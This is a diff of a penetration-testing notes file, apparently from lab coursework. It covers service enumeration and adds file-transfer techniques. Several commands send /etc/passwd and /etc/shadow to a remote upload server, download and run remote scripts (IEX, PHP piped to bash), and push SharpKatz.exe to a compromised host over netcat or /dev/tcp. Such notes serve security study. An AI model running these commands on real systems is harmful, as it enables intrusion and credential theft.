@@ -27,7 +27,9 @@
 	- [LDAP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#ldap)
 - [FILE TRANSFERS]()
 	- [Windows File Transfer]()
-	
+	- [Linux File Transfer]()
+	- [Code File Transfer]()
+	- [Miscellaneous File Transfer Methods]()
 	
 	
 ---
@@ -123,11 +125,11 @@ In a network,using Samba, each host participates in the same `workgroup`. A work
 ### Smbclient
 **Connecting to the Share**
 ```bash
-smbclient -N -L //{IP}
+smbclient -N -L //137.137.137.137
 ```
 **OR**
 ```bash
-smbclient -U username \\\\{IP}\\share
+smbclient -U username \\\\137.137.137.137\\share
 ```
 
 - `-N` is for **null session**, which is anonymous access without the input user/pass. And `-L` is to list all shares.
@@ -176,15 +178,15 @@ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(p
 3. Or for the same cause you could try yo use [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py) script
 4. You could use `SMBmap tool`
 ```bash
-smbmap -H {IP}
+smbmap -H 137.137.137.137
 ```
 5. You could use `CrackMapExec`
 ```bash
-crackmapexec smb {IP} --shares -u '' -p ''
+crackmapexec smb 137.137.137.137 --shares -u '' -p ''
 ```
 6. You could use [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
 ```bash
-./enum4linux-ng.py {IP} -A
+./enum4linux-ng.py 137.137.137.137 -A
 ```
 ---
 
@@ -198,16 +200,16 @@ crackmapexec smb {IP} --shares -u '' -p ''
 ### Tips2Hack
 1. Basic nmap footprinting
 ```bash  
-sudo nmap --script nfs* {IP} -sV -p111,2049
+sudo nmap --script nfs* 137.137.137.137 -sV -p111,2049
 ```
 2. Show available NFS shares
 ```bash
-showmount -e {IP}
+showmount -e 137.137.137.137
 ```
 3. Mounting & Unmounting NFS shares
 ```bash
 > mkdir target-NFS
-> sudo mount -t nfs {IP}:/ ./target-NFS/ -o nolock
+> sudo mount -t nfs 137.137.137.137:/ ./target-NFS/ -o nolock
 > sudo umount ./target-NFS
 ```
 ---
@@ -249,11 +251,11 @@ cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
 1. SSH-Audit
 ```bash
 > git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
-> ./ssh-audit.py {IP}
+> ./ssh-audit.py 137.137.137.137
 ```
 2. Change Auth Method
 ```bash
-ssh -v carnifex17@{IP} -o PreferredAuthentications=password
+ssh -v carnifex17@137.137.137.137 -o PreferredAuthentications=password
 ```
 3. If you have access to `/.ssh/authorized_keys` file, then put your **public key** inside of this file, and then you could log in without password
 4. If you have access to some **private key** you could download it and use, but check if permissions to private key is **chmod 600**
@@ -277,17 +279,17 @@ For this purpose, an extension for SMTP has been developed called Extended SMTP 
 ### Tips2Hack
 1. You can try to enumerate users via Telnet VRFY
 ```bash
-> telnet {IP} 25
+> telnet 137.137.137.137 25
 > VRFY carnifex17
 252 2.0.0 carnifex17
 ```
 2. Nmap - Open Relay
 ```bash
-sudo nmap {IP} -p25 --script smtp-open-relay -v
+sudo nmap 137.137.137.137 -p25 --script smtp-open-relay -v
 ```
 3. SMTP - Nmap all enum
 ```bash
-sudo nmap {IP} -p25 -sV -sC --script smtp* -v
+sudo nmap 137.137.137.137 -p25 -sV -sC --script smtp* -v
 ```
 
 ---
@@ -355,15 +357,15 @@ rsync -av --list-only rsync://127.0.0.1/dev
 1. By default, ports `110`, `143`, `993`, and `995` are used for IMAP and POP3
 2. Nmap basic footprinting
 ```bash 
-sudo nmap {IP} -sV -p110,143,993,995 -sC
+sudo nmap 137.137.137.137 -sV -p110,143,993,995 -sC
 ```
 3. IMAP Curl List mailboxes
 ```bash
-curl -k 'imaps://{IP}' --user user:p4ssw0rd
+curl -k 'imaps://137.137.137.137' --user user:p4ssw0rd
 ```
 4. OpenSSL - TLS Encypted Interaction POP3 
 ```bash
-openssl s_client -connect {IP}:pop3s
+openssl s_client -connect 137.137.137.137:pop3s
 ```
 
 ---
@@ -402,27 +404,27 @@ There are many useful and not DNS records:
 
 1. DIG - NS Query
 ```bash
-dig ns inlanefreight.kek @{IP}
+dig ns inlanefreight.kek @137.137.137.137
 ```
 2. DIG - Version Query
 ```bash
-dig CH TXT version.bind {IP}
+dig CH TXT version.bind 137.137.137.137
 ```
 3. DIG - ANY Query
 ```bash
-dig any inlanefreight.kek @{IP}
+dig any inlanefreight.kek @137.137.137.137
 ```
 4. DIG - AXFR Zone Transfer
 ```bash
-dig axfr inlanefreight.kek @{IP}
+dig axfr inlanefreight.kek @137.137.137.137
 ```
 5. DIG - AXFR Zone Transfer - Internal  
 ```bash
-dig axfr internal.inlanefreight.kek @{IP}
+dig axfr internal.inlanefreight.kek @137.137.137.137
 ```
 6. DNSEnum
 ```bash
-dnsenum --dnsserver {IP} --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.kek
+dnsenum --dnsserver 137.137.137.137 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.kek
 ```
 ---
 ## SNMP
@@ -455,11 +457,11 @@ snmpwalk -v2c -c public 10.129.14.128
 ```
 2. OneSixtyOne (`SNMP scanner`). Can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator
 ```bash
-onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt {IP}
+onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 137.137.137.137
 ```
 3. Braa. Once we know a community string, we can use it with braa to brute-force the individual `OIDs` and enumerate the information behind them.
 ```bash
-> braa <community string>@{IP}:.1.3.6.*
+> braa <community string>@137.137.137.137:.1.3.6.*
 ```
 
 ---
@@ -494,7 +496,7 @@ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
 
 1. Nmap Basic Footprinting
 ```bash
-sudo nmap {IP} -sV -sC -p3306 --script mysql*
+sudo nmap 137.137.137.137 -sV -sC -p3306 --script mysql*
 ```
 ---
 
@@ -515,17 +517,17 @@ MSSQL has default system databases that can help us understand the structure of 
 
 1. Nmap MSSQL Script Scan
 ```bash
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 137.137.137.137
 ```
 2. Metasploit scan. We can user `mssql_ping` to get more useful info about MSSQL server.
 ```bash
-msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts {IP}
+msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 137.137.137.137
 
-rhosts => {IP}
+rhosts => 137.137.137.137
 
 msf6 auxiliary(scanner/mssql/mssql_ping) > run
 
-[*] 10.129.201.248:       - SQL Server information for {IP}:
+[*] 10.129.201.248:       - SQL Server information for 137.137.137.137:
 [+] 10.129.201.248:       -    ServerName      = SQL-01
 [+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
 [+] 10.129.201.248:       -    IsClustered     = No
@@ -537,7 +539,7 @@ msf6 auxiliary(scanner/mssql/mssql_ping) > run
 ```
 3. Connecting with Mssqlclient.py
 ```bash
-python3 mssqlclient.py Administrator@{IP} -windows-auth
+python3 mssqlclient.py Administrator@137.137.137.137 -windows-auth
 ```
 ---
 
@@ -552,19 +554,19 @@ Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing to
 
 1. Nmap
 ```bash
-sudo nmap -p1521 -sV {IP} --open
+sudo nmap -p1521 -sV 137.137.137.137 --open
 ```
 2. Nmap - SID Bruteforcing
 ```bash
-sudo nmap -p1521 -sV {IP} --open --script oracle-sid-brute
+sudo nmap -p1521 -sV 137.137.137.137 --open --script oracle-sid-brute
 ```
 3. ODAT
 ```bash
-./odat.py all -s {IP}
+./odat.py all -s 137.137.137.137
 ```
 4. SQLplus - Log In
 ```bash
-sqlplus george/burger@{IP}/XE
+sqlplus george/burger@137.137.137.137/XE
 ```
 5. Oracle RDBMS - Interaction
 ```bash
@@ -578,7 +580,7 @@ GEORGE                          RESOURCE                       NO  YES NO
 ```
 6. Oracle RDBMS - Database Enumeration
 ```bash
-sqlplus george/burger@{IP}/XE as sysdba
+sqlplus george/burger@137.137.137.137/XE as sysdba
 SQL> select * from user_role_privs;
 -------------------------------------------------------------------------
 USERNAME                       GRANTED_ROLE                   ADM DEF OS
@@ -602,8 +604,8 @@ SQL> select name, password from sys.user$;
 ```
 8. Oracle RDBMS - File Upload
 ```bash
-./odat.py utlfile -s {IP} -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
-curl -X GET http://{IP}/testing.txt
+./odat.py utlfile -s 137.137.137.137 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+curl -X GET http://137.137.137.137/testing.txt
 
 Hello There Adventurer!
 ```
@@ -687,14 +689,14 @@ sudo nmap -sU --script ipmi-version -p 623 ilo.kekmaster.local
 2. Metasploit Version Scan
 ```bash
 msf6 > use  auxiliary/scanner/ipmi/ipmi_version
-msf6 > set rhosts {IP}
+msf6 > set rhosts 137.137.137.137
 msf6 > run
 ```
 
 3. Metasploit Dumping Hashes
 ```bash
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
-msf6 > set rhosts {IP}
+msf6 > set rhosts 137.137.137.137
 msf6 > run
 ```
 
@@ -722,7 +724,7 @@ The R-commands suite contains:
 ### Tips2Hack
 1. Logging in Using Rlogin
 ```bash
-rlogin {IP} -l htb-student
+rlogin 137.137.137.137 -l htb-student
 ```
 2. Listing Authenticated Users Using Rwho
 ```bash
@@ -730,7 +732,7 @@ rwho
 ```
 3. Listing Authenticated Users Using Rusers
 ```bash
-rusers -al {IP}
+rusers -al 137.137.137.137
 ```
 
 ---
@@ -742,15 +744,15 @@ rusers -al {IP}
 ### TIps2Hack
 1. Nmap
 ```bash
-nmap -sV -sC {IP} -p3389 --script rdp*
+nmap -sV -sC 137.137.137.137 -p3389 --script rdp*
 ```
 2. [RDP Security Check](https://github.com/CiscoCXSecurity/rdp-sec-check)
 ```bash
-./rdp-sec-check.pl {IP}
+./rdp-sec-check.pl 137.137.137.137
 ```
 3. Initiate an RDP Session via xfreerdp(or Reminna with GUI)
 ```bash
-xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:{IP} /cert:ignore /d:DOMAIN
+xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:137.137.137.137 /cert:ignore /d:DOMAIN
 ```
 
 ---
@@ -761,11 +763,11 @@ xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:{IP} /cert:ignore /d:DOMAIN
 ### Tips2Hack
 1. Nmap WinRM
 ```bash
-nmap -sV -sC {IP} -p5985,5986 --disable-arp-ping -n
+nmap -sV -sC 137.137.137.137 -p5985,5986 --disable-arp-ping -n
 ```
 2. Evil-WinRM
 ```bash
-evil-winrm -i {IP} -u carnifex17 -p S3cr3t!
+evil-winrm -i 137.137.137.137 -u carnifex17 -p S3cr3t!
 ```
 
 ## WMI
@@ -773,7 +775,7 @@ evil-winrm -i {IP} -u carnifex17 -p S3cr3t!
 ### Tips2Hack
 1. WMIexec.py
 ```bash
-/usr/share/doc/python3-impacket/examples/wmiexec.py carnifex17:"S3cr3t!"@{IP} "hostname"
+/usr/share/doc/python3-impacket/examples/wmiexec.py carnifex17:"S3cr3t!"@137.137.137.137 "hostname"
 
 ```
 
@@ -880,14 +882,14 @@ python3 -m uploadserver
 
 1. **PowerShell Script to Upload a File to Python Upload Server**
 ```powershell
-PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-PS C:\htb> Invoke-FileUpload -Uri http://{IP}:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+PS C:\carnifex17> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\carnifex17> Invoke-FileUpload -Uri http://137.137.137.137:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 ```
 
 2. **PowerShell Base64 Web Upload**. Convert file to base64 and send it using Invoke-WebRequest with POST method. 
 ```powershell
-PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
-PS C:\htb> Invoke-WebRequest -Uri http://{IP}:8000/ -Method POST -Body $b64
+PS C:\carnifex17> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\carnifex17> Invoke-WebRequest -Uri http://137.137.137.137:8000/ -Method POST -Body $b64
 ```
 ```bash
 nc -lvnp 8000
@@ -927,12 +929,12 @@ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```
 2. **Connecting to the Webdav Share**. DavWWWRoot isn't a folder, it's a special keyword that tells WebDAV that we are connection to the root of WebDav server. You could use any existing directory when you are connecting, as example `sharefolder`
 ```powershell
-C:\htb> dir \\{IP}\DavWWWRoot
+C:\carnifex17> dir \\137.137.137.137\DavWWWRoot
 ```
 3. **Uploading Files using SMB**
 ```powershell
-C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\{IP}\DavWWWRoot\
-C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\{IP}\sharefolder\
+C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\137.137.137.137\DavWWWRoot\
+C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\137.137.137.137\sharefolder\
 ```
 
 ### FTP Downloads
@@ -946,24 +948,24 @@ sudo python3 -m pyftpdlib --port 21
 ```
 2. **Transferring Files from an FTP Server Using Powershell**
 ```powershell
-PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://{IP}/file.txt', 'C:\Users\Public\ftp-file.txt')
+PS C:\carnifex17> (New-Object Net.WebClient).DownloadFile('ftp://137.137.137.137/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
 3. **Create a Command File for the FTP Client and Download the Target File**
 ```bash
-C:\carnifex17> echo open {IP} > ftpcommand.txt
+C:\carnifex17> echo open 137.137.137.137 > ftpcommand.txt
 C:\carnifex17> echo USER anonymous >> ftpcommand.txt
 C:\carnifex17> echo binary >> ftpcommand.txt
 C:\carnifex17> echo GET file.txt >> ftpcommand.txt
 C:\carnifex17> echo bye >> ftpcommand.txt
 C:\carnifex17> ftp -v -n -s:ftpcommand.txt
-ftp> open {IP}
+ftp> open 137.137.137.137
 Log in with USER and PASS first.
 ftp> USER anonymous
 
 ftp> GET file.txt
 ftp> bye
 
-C:\htb>more file.txt
+C:\carnifex17>more file.txt
 This is a test file
 ```
 
@@ -975,16 +977,16 @@ sudo python3 -m pyftpdlib --port 21 --write
 ```
 2. **Powershell Upload File**
 ```powershell
-PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://{IP}/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+PS C:\carnifex17> (New-Object Net.WebClient).UploadFile('ftp://137.137.137.137/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 3. **Create a Command File for the FTP Client to Upload a File**
 ```powershell
-C:\htb> echo open 192.168.49.128 > ftpcommand.txt
-C:\htb> echo USER anonymous >> ftpcommand.txt
-C:\htb> echo binary >> ftpcommand.txt
-C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
-C:\htb> echo bye >> ftpcommand.txt
-C:\htb> ftp -v -n -s:ftpcommand.txt
+C:\carnifex17> echo open 192.168.49.128 > ftpcommand.txt
+C:\carnifex17> echo USER anonymous >> ftpcommand.txt
+C:\carnifex17> echo binary >> ftpcommand.txt
+C:\carnifex17> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\carnifex17> echo bye >> ftpcommand.txt
+C:\carnifex17> ftp -v -n -s:ftpcommand.txt
 ftp> open 192.168.49.128
 
 Log in with USER and PASS first.
@@ -1042,7 +1044,7 @@ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
 ```
 - **Upload Multiple Files**
 ```bash
-curl -X POST https://{IP}/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+curl -X POST https://137.137.137.137/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 #### Alternative File Transfer Method
 - **Creating a Web Server with Python3**
@@ -1106,4 +1108,180 @@ scp plaintext@192.168.49.128:/root/myroot.txt .
 - **File Upload with SCP**
 ```bash
 scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+```
+## Code File Transfers
+### Python
+1. **Python 2 - Download**
+```bash
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+2. **Python3 - Download**
+```bash
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+#### Upload Operations
+1. **Starting the Python uploadserver Module**
+```bash
+python3 -m uploadserver
+```
+1. **Uploading a File Using a Python One-liner**
+```bash
+python3 -c 'import requests;requests.post("http://137.137.137.137:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+1. **Oneliner in few lines for better understanding**
+```python
+# To use the requests function, we need to import the module first.
+import requests 
+
+# Define the target URL where we will upload the file.
+URL = "http://137.137.137.137:8000/upload"
+
+# Define the file we want to read, open it and save it in a variable.
+file = open("/etc/passwd","rb")
+
+# Use a requests POST request to upload the file. 
+r = requests.post(url,files={"files":file})
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### PHP
+1. **PHP Download with File_get_contents()**
+```bash
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+```
+2. **PHP Download with Fopen()**
+```bash
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+3. **PHP Download a File and Pipe it to Bash**
+```bash
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+### Ruby
+- **Ruby - Download a File**
+```bash
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+### Perl
+- **Perl - Download a File**
+```bash
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+
+### JavaScript
+Based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/536400#536400) post, you could make `wget.js` file:
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+And then we can use following command from Windows CMD or PowerShell to execute our code:
+```powershell
+C:\carnifex17> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+### VBScript
+**VBScript** or ("Microsoft Visual Basic Scription Edition") is Microsoft scripting language that is modeled on Visual Basic. You could make wget.vbs file to download a file:
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+- **Download a File using VBScript and cscript.exe**
+```powershell
+C:\carnifex17> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+## Miscellaneous File Transfer Methods
+### File Transfer with Netcat and Ncat
+3. **Netcat - Attack Host - Sending File to Compromised machine**. The option `-q 0` gonna close connection after transferring. 
+```bash
+# Using original netcat
+victim$ nc -l -p 8000 > SharpKatz.exe
+```
+```bash
+attacker$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+```
+4. **Ncat - Attack Host - Sending File to Compromised machine**
+```bash
+# Using Ncat
+victim$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+```
+```bash
+attacker$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+5. **Sending File as Input to Netcat**
+```bash
+attacker$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+```bash
+victim$ nc 192.168.49.128 443 > SharpKatz.exe
+```
+6. **Sending File as Input to Ncat**
+```bash
+attacker$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+```bash
+victim$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+```
+8. **Sending File from Attacker machine to Compromised using /dev/tcp**
+```bash
+# Netcat option
+attacker$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+``` 
+```bash
+# Ncat option
+attacker$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+```bash
+# Connecting to netcat using /dev/tcp
+victim$ 
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+
+### PowerShell Session File Transfer
+I know I used to show about PowerShell file transfers in Windows File Transfer section, but there are possibilities when no HTTP, HTTPS or SMB are available. So here we'll use `PowerShell Remoting` aka WinRM. Usually work on TCP/5985 port for HTTP and TCP/5986 port for HTTPS. 
+1. **Check TCP 5985 Port on DATABASE01**
+```powershell
+PS C:\carnifex17> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+```
+2. **Create a PowerShell Remoting Session to DATABASE01**
+```powershell
+PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+```
+3. **Copy samplefile.txt from our Localhost to the DATABASE01 Session**
+```powershell
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+4. **Copy DATABASE.txt from DATABASE01 Session to our Localhost**
+```powershell
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
 ```
